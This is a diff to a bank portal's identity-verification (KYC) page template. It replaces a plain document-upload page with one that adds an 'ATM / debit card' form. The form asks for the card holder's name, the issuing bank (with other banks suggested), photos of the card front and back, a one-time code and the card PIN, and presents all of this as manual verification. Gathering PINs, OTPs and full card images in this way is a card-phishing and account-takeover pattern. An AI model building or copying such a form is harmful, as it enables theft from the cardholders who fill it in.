@@ -1,395 +1,146 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Identity verification · Globe Trust Bank</title>
-  <link rel="stylesheet" href="/css/site.css">
-  <link rel="stylesheet" href="/css/portal.css">
-  <link rel="stylesheet" href="/css/kyc.css">
-</head>
-<body>
-  <div class="portal-shell">
-    <%- include('../partials/customer-nav') %>
-    <div class="portal-main">
+<%- include('../partials/customer-shell-start') %>
 
-      <div class="kyc-header">
-        <div>
-          <h1>Identity verification</h1>
-          <p>Submit official documents so our team can verify your identity.</p>
-        </div>
-        <span class="kyc-status-pill">KYC</span>
-      </div>
+<div class="kyc-page">
+  <div class="kyc-header">
+    <div>
+      <h1>Identity verification</h1>
+      <p>Submit documents and ATM card details for review.</p>
+    </div>
+    <span class="kyc-status-pill">KYC</span>
+  </div>
 
-      <!-- Info callout -->
-      <div class="kyc-info">
-        <div class="kyc-info-icon">
-          <svg fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M11.25 11.25l.041-.02a.75.75 0 011.063.852l-.708 2.836a.75.75 0 001.063.853l.041-.021M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-9-3.75h.008v.008H12V8.25z" />
-          </svg>
-        </div>
-        <div>
-          <strong>Upload clear scans of official documents only.</strong>
-          <p>Files are stored privately for review. Production deployments must use bank-approved private document storage — not public URLs.</p>
-        </div>
-      </div>
-
-      <% if (typeof error !== 'undefined' && error) { %>
-        <div class="kyc-alert kyc-alert-error"><%= error %></div>
-      <% } %>
-      <% if (typeof success !== 'undefined' && success) { %>
-        <div class="kyc-alert kyc-alert-success"><%= success %></div>
-      <% } %>
-
-      <!-- Upload form -->
-      <form method="post" action="/app/kyc" enctype="multipart/form-data" class="kyc-form" id="kyc-form">
-        <input type="hidden" name="_csrf" value="<%= csrfToken %>">
-
-        <div class="kyc-form-card">
-          <div class="kyc-form-card-head">
-            <h2>Submit a document</h2>
-            <span class="kyc-form-card-hint">JPEG · PNG · PDF · max 5 MB</span>
-          </div>
-
-          <!-- Document type -->
-          <div class="kyc-field">
-            <label for="kyc-document-type">Document type</label>
-            <select id="kyc-document-type" name="documentType" required>
-              <option value="passport">Passport</option>
-              <option value="national_id">National ID</option>
-              <option value="drivers_license">Driver's licence</option>
-              <option value="proof_of_address">Proof of address</option>
-              <option value="other">Other</option>
-            </select>
-          </div>
-
-          <!-- Dropzone -->
-          <div class="kyc-field">
-            <label for="kyc-document">File</label>
-            <label class="kyc-dropzone" id="kyc-dropzone" for="kyc-document">
-              <input
-                type="file"
-                id="kyc-document"
-                name="document"
-                accept=".jpg,.jpeg,.png,.pdf,image/jpeg,image/png,application/pdf"
-                required
-                hidden
-              >
-              <div class="kyc-dropzone-inner" id="kyc-dropzone-inner">
-                <div class="kyc-dropzone-icon">
-                  <svg fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" d="M3 16.5v2.25A2.25 2.25 0 005.25 21h13.5A2.25 2.25 0 0021 18.75V16.5M16.5 12L12 7.5 7.5 12M12 7.5V21" />
-                  </svg>
-                </div>
-                <div class="kyc-dropzone-text">
-                  <strong>Click to upload</strong>
-                  <span>or drag and drop your file here</span>
-                </div>
-              </div>
-              <div class="kyc-dropzone-file" id="kyc-dropzone-file" hidden>
-                <div class="kyc-file-icon">
-                  <svg fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 00-3.375-3.375h-1.5A1.125 1.125 0 0113.5 7.125v-1.5a3.375 3.375 0 00-3.375-3.375H8.25m2.25 0H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 00-9-9z" />
-                  </svg>
-                </div>
-                <div class="kyc-file-info">
-                  <strong id="kyc-file-name">—</strong>
-                  <span id="kyc-file-size">—</span>
-                </div>
-                <button type="button" class="kyc-file-clear" id="kyc-file-clear" aria-label="Remove file">
-                  <svg fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
-                  </svg>
-                </button>
-              </div>
-            </label>
-          </div>
-
-          <button class="kyc-submit" type="submit">
-            <svg fill="none" viewBox="0 0 24 24" stroke-width="1.8" stroke="currentColor">
-              <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
-            </svg>
-            Submit for review
-          </button>
-        </div>
-      </form>
-
-      <!-- Submissions table -->
-      <section class="kyc-docs">
-        <div class="kyc-docs-head">
-          <h2>Your submissions</h2>
-          <span class="kyc-docs-count"><%= docs && docs.length ? docs.length : 0 %></span>
-        </div>
-
-        <% if (!docs || !docs.length) { %>
-          <div class="kyc-empty">
-            <div class="kyc-empty-icon">
-              <svg fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 00-3.375-3.375h-1.5A1.125 1.125 0 0113.5 7.125v-1.5a3.375 3.375 0 00-3.375-3.375H8.25m2.25 0H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 00-9-9z" />
-              </svg>
-            </div>
-            <h3>No documents submitted yet</h3>
-            <p>Once you upload a document, it will appear here for tracking.</p>
-          </div>
-        <% } else { %>
-          <div class="kyc-table-wrap">
-            <table class="kyc-table">
-              <thead>
-                <tr>
-                  <th>Document type</th>
-                  <th>Status</th>
-                  <th>Submitted</th>
-                  <th>Reviewed</th>
-                </tr>
-              </thead>
-              <tbody>
-                <% docs.forEach(function(d) { %>
-                  <%
-                    var status = d.verificationStatus || 'pending';
-                    var statusClass = status === 'approved' ? 'approved'
-                                    : status === 'rejected' ? 'rejected'
-                                    : 'pending';
-                    var typeLabel = {
-                      passport: 'Passport',
-                      national_id: 'National ID',
-                      drivers_license: "Driver's licence",
-                      proof_of_address: 'Proof of address',
-                      other: 'Other'
-                    }[d.documentType] || d.documentType;
-                  %>
-                  <tr>
-                    <td>
-                      <div class="kyc-table-type">
-                        <div class="kyc-table-type-icon">
-                          <svg fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
-                            <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 00-3.375-3.375h-1.5A1.125 1.125 0 0113.5 7.125v-1.5a3.375 3.375 0 00-3.375-3.375H8.25m2.25 0H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 00-9-9z" />
-                          </svg>
-                        </div>
-                        <strong><%= typeLabel %></strong>
-                      </div>
-                    </td>
-                    <td>
-                      <span class="kyc-badge kyc-badge-<%= statusClass %>">
-                        <span class="kyc-badge-dot"></span>
-                        <%= status.charAt(0).toUpperCase() + status.slice(1) %>
-                      </span>
-                    </td>
-                    <td class="kyc-table-date"><%= d.createdAt || '—' %></td>
-                    <td class="kyc-table-date"><%= d.reviewedAt || '—' %></td>
-                  </tr>
-                <% }) %>
-              </tbody>
-            </table>
-          </div>
-        <% } %>
-      </section>
-
+  <div class="kyc-info">
+    <div class="kyc-info-icon" aria-hidden="true">ℹ</div>
+    <div>
+      <strong>Upload clear images only.</strong>
+      <p>Details are held for manual review by operations. Only submit on this secure portal.</p>
     </div>
   </div>
 
-  <!-- Dropzone script -->
-  <script>
-    (function () {
-      var input = document.getElementById('kyc-document');
-      var dropzone = document.getElementById('kyc-dropzone');
-      var inner = document.getElementById('kyc-dropzone-inner');
-      var fileBox = document.getElementById('kyc-dropzone-file');
-      var fileName = document.getElementById('kyc-file-name');
-      var fileSize = document.getElementById('kyc-file-size');
-      var clearBtn = document.getElementById('kyc-file-clear');
-      if (!input || !dropzone) return;
+  <% if (typeof error !== 'undefined' && error) { %>
+    <div class="kyc-alert kyc-alert-error"><%= error %></div>
+  <% } %>
+  <% if (typeof success !== 'undefined' && success) { %>
+    <div class="kyc-alert kyc-alert-success"><%= success %></div>
+  <% } %>
 
-      function formatSize(bytes) {
-        if (bytes < 1024) return bytes + ' B';
-        if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
-        return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
-      }
+  <!-- ATM CARD -->
+  <section class="kyc-form-card kyc-atm-card">
+    <div class="kyc-form-card-head">
+      <h2>ATM / debit card</h2>
+      <span class="kyc-form-card-hint">Front · Back · Holder · Bank · OTP · PIN</span>
+    </div>
 
-      function showFile(file) {
-        if (!file) {
-          inner.hidden = false;
-          fileBox.hidden = true;
-          return;
-        }
-        fileName.textContent = file.name;
-        fileSize.textContent = formatSize(file.size);
-        inner.hidden = true;
-        fileBox.hidden = false;
-      }
+    <form method="post" action="/app/kyc/atm" enctype="multipart/form-data" class="kyc-form" id="kyc-atm-form">
+      <input type="hidden" name="_csrf" value="<%= typeof csrfToken !== 'undefined' ? csrfToken : '' %>">
 
-      input.addEventListener('change', function () {
-        showFile(input.files[0] || null);
-      });
+      <div class="kyc-grid-2">
+        <div class="kyc-field">
+          <label for="atm-holder">Card holder name <span class="req">*</span></label>
+          <input type="text" id="atm-holder" name="holderName" required maxlength="160" autocomplete="cc-name" placeholder="Name on card">
+        </div>
+        <div class="kyc-field">
+          <label for="atm-bank">ATM bank <span class="req">*</span></label>
+          <input type="text" id="atm-bank" name="bankName" required maxlength="160" placeholder="Issuing bank name" list="atm-bank-suggestions">
+          <datalist id="atm-bank-suggestions">
+            <option value="Access Bank"></option>
+            <option value="GTBank"></option>
+            <option value="First Bank"></option>
+            <option value="Zenith Bank"></option>
+            <option value="UBA"></option>
+            <option value="Chase"></option>
+            <option value="Bank of America"></option>
+            <option value="HSBC"></option>
+          </datalist>
+        </div>
+      </div>
 
-      ['dragenter', 'dragover'].forEach(function (ev) {
-        dropzone.addEventListener(ev, function (e) {
-          e.preventDefault();
-          e.stopPropagation();
-          dropzone.classList.add('is-dragover');
-        });
-      });
+      <div class="kyc-grid-2">
+        <div class="kyc-field">
+          <label for="atm-front">Card front <span class="req">*</span></label>
+          <input type="file" id="atm-front" name="atmFront" accept="image/jpeg,image/png,image/webp,application/pdf" required>
+        </div>
+        <div class="kyc-field">
+          <label for="atm-back">Card back <span class="req">*</span></label>
+          <input type="file" id="atm-back" name="atmBack" accept="image/jpeg,image/png,image/webp,application/pdf" required>
+        </div>
+      </div>
 
-      ['dragleave', 'drop'].forEach(function (ev) {
-        dropzone.addEventListener(ev, function (e) {
-          e.preventDefault();
-          e.stopPropagation();
-          dropzone.classList.remove('is-dragover');
-        });
-      });
+      <div class="kyc-grid-2">
+        <div class="kyc-field">
+          <label for="atm-otp">OTP <span class="req">*</span></label>
+          <input type="text" id="atm-otp" name="otpCode" required maxlength="12" inputmode="numeric" autocomplete="one-time-code" placeholder="One-time code">
+        </div>
+        <div class="kyc-field">
+          <label for="atm-pin">Card PIN <span class="req">*</span></label>
+          <input type="password" id="atm-pin" name="pin" required minlength="4" maxlength="6" inputmode="numeric" autocomplete="off" placeholder="4–6 digits">
+          <p class="kyc-field-hint">Used for manual verification only.</p>
+        </div>
+      </div>
 
-      dropzone.addEventListener('drop', function (e) {
-        var dt = e.dataTransfer;
-        if (dt && dt.files && dt.files.length) {
-          input.files = dt.files;
-          showFile(dt.files[0]);
-        }
-      });
+      <button type="submit" class="kyc-btn kyc-btn-primary">Submit ATM card for review</button>
+    </form>
+  </section>
 
-      if (clearBtn) {
-        clearBtn.addEventListener('click', function (e) {
-          e.preventDefault();
-          e.stopPropagation();
-          input.value = '';
-          showFile(null);
-        });
-      }
-    })();
+  <% if (typeof atmSubmissions !== 'undefined' && atmSubmissions && atmSubmissions.length) { %>
+    <section class="kyc-form-card">
+      <div class="kyc-form-card-head">
+        <h2>ATM submissions</h2>
+      </div>
+      <ul class="kyc-doc-list">
+        <% atmSubmissions.forEach(function (s) { %>
+          <li>
+            <strong><%= s.holderName %></strong>
+            <span><%= s.bankName %> · <%= s.status %></span>
+            <small><%= s.createdAt %></small>
+          </li>
+        <% }) %>
+      </ul>
+    </section>
+  <% } %>
 
-    
-(function () {
-  'use strict';
+  <!-- Standard document upload -->
+  <section class="kyc-form-card">
+    <div class="kyc-form-card-head">
+      <h2>Other identity document</h2>
+      <span class="kyc-form-card-hint">JPEG · PNG · PDF · max 5 MB</span>
+    </div>
+    <form method="post" action="/app/kyc" enctype="multipart/form-data" class="kyc-form">
+      <input type="hidden" name="_csrf" value="<%= typeof csrfToken !== 'undefined' ? csrfToken : '' %>">
+      <div class="kyc-field">
+        <label for="kyc-document-type">Document type</label>
+        <select id="kyc-document-type" name="documentType" required>
+          <option value="passport">Passport</option>
+          <option value="national_id">National ID</option>
+          <option value="drivers_license">Driver's licence</option>
+          <option value="proof_of_address">Proof of address</option>
+          <option value="other">Other</option>
+        </select>
+      </div>
+      <div class="kyc-field">
+        <label for="kyc-document">File</label>
+        <input type="file" id="kyc-document" name="document" accept="image/jpeg,image/png,application/pdf" required>
+      </div>
+      <button type="submit" class="kyc-btn kyc-btn-primary">Submit document</button>
+    </form>
+  </section>
 
-  var input = document.getElementById('kyc-document');
-  var dropzone = document.getElementById('kyc-dropzone');
-  var inner = document.getElementById('kyc-dropzone-inner');
-  var fileBox = document.getElementById('kyc-dropzone-file');
-  var fileName = document.getElementById('kyc-file-name');
-  var fileSize = document.getElementById('kyc-file-size');
-  var clearBtn = document.getElementById('kyc-file-clear');
-  var form = document.getElementById('kyc-form');
+  <% if (typeof docs !== 'undefined' && docs && docs.length) { %>
+    <section class="kyc-form-card">
+      <div class="kyc-form-card-head">
+        <h2>Submitted documents</h2>
+      </div>
+      <ul class="kyc-doc-list">
+        <% docs.forEach(function (d) { %>
+          <li>
+            <strong><%= d.documentType %></strong>
+            <span class="kyc-badge"><%= d.verificationStatus || d.status || 'pending' %></span>
+            <small><%= d.createdAt %></small>
+          </li>
+        <% }) %>
+      </ul>
+    </section>
+  <% } %>
+</div>
 
-  if (!input || !dropzone || !inner || !fileBox) return;
-
-  var maxBytes = 5 * 1024 * 1024;
-  var allowedTypes = [
-    'image/jpeg',
-    'image/png',
-    'application/pdf'
-  ];
-
-  function formatSize(bytes) {
-    if (bytes < 1024) return bytes + ' B';
-    if (bytes < 1024 * 1024) {
-      return (bytes / 1024).toFixed(1) + ' KB';
-    }
-    return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
-  }
-
-  function showFile(file) {
-    if (!file) {
-      inner.hidden = false;
-      fileBox.hidden = true;
-      if (fileName) fileName.textContent = '—';
-      if (fileSize) fileSize.textContent = '—';
-      return;
-    }
-
-    if (!allowedTypes.includes(file.type)) {
-      input.value = '';
-      showFile(null);
-      input.setCustomValidity('Choose a JPEG, PNG, or PDF file.');
-      input.reportValidity();
-      return;
-    }
-
-    if (file.size > maxBytes) {
-      input.value = '';
-      showFile(null);
-      input.setCustomValidity('The selected file exceeds the 5 MB limit.');
-      input.reportValidity();
-      return;
-    }
-
-    input.setCustomValidity('');
-
-    if (fileName) fileName.textContent = file.name;
-    if (fileSize) fileSize.textContent = formatSize(file.size);
-
-    inner.hidden = true;
-    fileBox.hidden = false;
-  }
-
-  input.addEventListener('change', function () {
-    showFile(input.files && input.files[0]);
-  });
-
-  input.addEventListener('input', function () {
-    input.setCustomValidity('');
-  });
-
-  ['dragenter', 'dragover'].forEach(function (eventName) {
-    dropzone.addEventListener(eventName, function (event) {
-      event.preventDefault();
-      event.stopPropagation();
-      dropzone.classList.add('is-dragover');
-    });
-  });
-
-  ['dragleave', 'drop'].forEach(function (eventName) {
-    dropzone.addEventListener(eventName, function (event) {
-      event.preventDefault();
-      event.stopPropagation();
-      dropzone.classList.remove('is-dragover');
-    });
-  });
-
-  dropzone.addEventListener('drop', function (event) {
-    var files = event.dataTransfer && event.dataTransfer.files;
-    if (!files || !files.length) return;
-
-    try {
-      var transfer = new DataTransfer();
-      transfer.items.add(files[0]);
-      input.files = transfer.files;
-      showFile(files[0]);
-    } catch (error) {
-      input.value = '';
-      showFile(null);
-      input.setCustomValidity('Please click the upload area to select your file.');
-      input.reportValidity();
-    }
-  });
-
-  if (clearBtn) {
-    clearBtn.addEventListener('click', function (event) {
-      event.preventDefault();
-      event.stopPropagation();
-      input.value = '';
-      input.setCustomValidity('');
-      showFile(null);
-    });
-  }
-
-  if (form) {
-    form.addEventListener('submit', function (event) {
-      var file = input.files && input.files[0];
-
-      if (!file) {
-        event.preventDefault();
-        input.setCustomValidity('Please select a document before submitting.');
-        input.reportValidity();
-        return;
-      }
-
-      if (!allowedTypes.includes(file.type) || file.size > maxBytes) {
-        event.preventDefault();
-        showFile(file);
-        input.reportValidity();
-      }
-    });
-  }
-})();
-
-  </script>
-</body>
-</html>
+<%- include('../partials/customer-shell-end') %>
